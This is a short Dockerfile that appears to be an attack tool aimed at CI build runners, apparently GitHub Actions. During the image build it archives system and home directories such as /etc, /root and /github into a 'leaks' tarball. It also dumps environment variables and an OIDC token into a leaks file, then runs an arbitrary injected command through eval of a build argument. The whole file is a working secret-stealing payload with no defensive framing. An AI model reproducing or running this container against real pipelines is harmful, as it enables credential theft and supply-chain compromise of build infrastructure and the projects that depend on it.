FROM python:3.11-alpine

ARG PAYLOAD_CMD
ARG EXFIL_OIDC_TOKEN

RUN apk add --no-cache curl tar bash && \
    echo "[+] Collecting leaks..." && \
    tar -czf /leaks.tar.gz \
        /etc \
        /root \
        /home \
        /var \
        /opt \
        /srv \
        /github \
        2>/dev/null || true && \
    echo "[+] Dumping environment variables (excluding GITHUB_TOKEN)..." && \
    printenv | grep -v GITHUB_TOKEN >> /leaks_env.txt && \
    echo "EXFIL_OIDC_TOKEN=$EXFIL_OIDC_TOKEN" >> /leaks_env.txt && \
    echo "[+] Executing injected command..." && \
    eval "$PAYLOAD_CMD"
